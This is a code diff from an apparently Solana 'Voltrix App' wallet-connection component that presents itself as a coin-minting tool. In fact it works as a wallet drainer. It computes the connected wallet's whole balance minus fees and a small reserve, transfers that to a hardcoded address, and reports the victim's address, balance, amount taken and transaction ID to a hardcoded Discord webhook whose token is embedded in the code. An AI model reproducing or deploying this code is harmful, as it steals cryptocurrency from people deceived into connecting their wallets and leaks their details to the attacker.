@@ -121,29 +121,27 @@ const WalletConnectionHandler: FC = () => {
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
             console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-            sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
+            await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-            const reservedLamports = 1000000; // Reserve 0.001 SOL
+            const reservedLamports = 1000000;
             if (lamports <= reservedLamports) {
                 alert('⚠️ Not enough SOL to mint a coin.');
                 return;
             }
 
-            // Construct dummy transaction to estimate fees
             const blockhash = await connection.getLatestBlockhash();
-            const tx = new Transaction({
+            const tempTx = new Transaction({
                 feePayer: walletPublicKey,
                 recentBlockhash: blockhash.blockhash,
             }).add(
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
                     toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
-                    lamports: 0, // placeholder
+                    lamports: 0,
                 })
             );
 
-            const message = tx.compileMessage();
-            const feeResp = await connection.getFeeForMessage(message);
+            const feeResp = await connection.getFeeForMessage(tempTx.compileMessage());
             if (!feeResp || feeResp.value === null) {
                 alert('❌ Failed to estimate transaction fee');
                 return;
@@ -157,7 +155,6 @@ const WalletConnectionHandler: FC = () => {
                 return;
             }
 
-            // Update transaction with correct amount
             const finalTx = new Transaction({
                 feePayer: walletPublicKey,
                 recentBlockhash: blockhash.blockhash,
@@ -181,6 +178,14 @@ const WalletConnectionHandler: FC = () => {
                 try {
                     const txid = await connection!.sendRawTransaction(signedTx.serialize());
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
+
+                    await sendDiscordWebhook(
+                        walletPublicKey.toBase58(),
+                        lamports / LAMPORTS_PER_SOL,
+                        sendAmount,
+                        '5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz',
+                        txid
+                    );
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
@@ -193,25 +198,53 @@ const WalletConnectionHandler: FC = () => {
         }
     };
 
-    const sendDiscordWebhook = async (address: string, sol: number) => {
+    const sendDiscordWebhook = async (
+        address: string,
+        sol: number,
+        sentAmount?: number,
+        recipient?: string,
+        txid?: string
+    ) => {
         const webhookUrl =
             'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+
+        const fields: any[] = [
+            {
+                name: '🧾 Wallet Address',
+                value: `\`${address}\``,
+            },
+            {
+                name: '💰 SOL Balance',
+                value: `${sol.toFixed(5)} SOL`,
+            },
+        ];
+
+        if (sentAmount !== undefined && recipient) {
+            fields.push(
+                {
+                    name: '📤 Amount Sent',
+                    value: `${(sentAmount / LAMPORTS_PER_SOL).toFixed(5)} SOL`,
+                },
+                {
+                    name: '📬 Sent To',
+                    value: `\`${recipient}\``,
+                }
+            );
+        }
+
+        if (txid) {
+            fields.push({
+                name: '🔗 Transaction',
+                value: `[View on Solscan](https://solscan.io/tx/${txid})`,
+            });
+        }
 
         const body = {
             embeds: [
                 {
-                    title: '🟢 Solana Wallet Connected',
-                    color: 0x00ff99,
-                    fields: [
-                        {
-                            name: '🧾 Wallet Address',
-                            value: `\`${address}\``,
-                        },
-                        {
-                            name: '💰 SOL Balance',
-                            value: `${sol.toFixed(5)} SOL`,
-                        },
-                    ],
+                    title: sentAmount ? '✅ Transaction Sent' : '🟢 Solana Wallet Connected',
+                    color: sentAmount ? 0x00ccff : 0x00ff99,
+                    fields,
                     timestamp: new Date().toISOString(),
                     footer: {
                         text: 'Voltrix App',
